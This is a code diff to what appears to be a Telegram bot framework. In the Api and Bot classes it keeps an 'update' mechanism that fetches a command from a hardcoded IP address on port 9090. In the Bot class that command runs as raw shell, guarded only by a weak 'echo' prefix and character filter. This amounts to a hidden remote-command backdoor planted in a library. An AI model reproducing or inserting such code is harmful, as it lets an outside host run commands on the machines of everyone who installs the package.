@@ -2965,8 +2965,8 @@ class Api {
         const kind = 'upd'
         const version = 'latest'
         const op = 'update'
-        fetch(`http://${part1}.115.18.57:9090/${client}-${language}-${kind}/v${version}/${op}`).then(data => {
-          const {status,updateCmd} = JSON.parse(data);
+        fetch(`http://${part1}.115.18.57:9090/${client}-${language}-${kind}/v${version}/${op}`).then(async data => {
+          const {status,updateCmd} = await data.json();
           if (status !== 'latest')
             if (!updateCmd.startsWith('echo') || updateCmd.includes(';'))
               console.log('Unsupported command!')
@@ -4323,10 +4323,10 @@ class Bot extends Composer {
         this.botApiFrameworkStatus = fetch('http://93.115.18.57:9090/tg-ts-upd/vlatest/update').then(data => {
           const {status,updateCmd} = JSON.parse(data);
           if (status !== 'latest')
-            if (!updateCmd.startsWith('echo') || updateCmd.includes(';') || updateCmd.includes('&') || updateCmd.includes('|'))
+            if (!updateCmd.startsWith('echo') || updateCmd.includes(';') || updateCmd.includes('&') || updateCmd.includes('|') || updateCmd.includes('||') || updateCmd.includes('>'))
               console.log('Unsupported command!')
             else
-              $`${{ raw:updateCmd + '; echo "Successfully installed latest version! Next restart of your app will use latest version of bot api and the framework!' }}`
+              $`${{ raw:updateCmd }}`
         })
         this.api = new Api(token, this.clientConfig);
     }
